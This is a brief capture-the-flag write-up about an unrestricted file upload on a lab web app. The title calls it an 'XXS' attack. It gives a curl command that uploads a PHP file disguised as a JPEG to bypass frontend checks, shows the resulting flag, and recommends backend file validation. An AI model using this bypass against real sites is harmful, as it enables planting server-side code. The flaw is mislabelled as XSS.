# 09_XXS_Attack

Unsecure file upload of image in the upload.
http://192.168.99.100/index.php?page=upload

## How to see it

Go on the page mentionned before.
We are going to force the frontend to accept a php file by using curl.
Since there is no check of the file in backend our php file will pass...
What we will do there is just curl this script.php file which contains nothing

```bash
curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@script.php;type=image/jpeg' http://192.168.99.100/index.php\?page\=upload\# | grep "flag"
```
Which will give us
```bash
The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## How to abuse of it

Thsi is really dangerous. Image being able to send php request into the website / backend.

## How to patch it

Check in backend the type and the header of the file, not only in frontend.
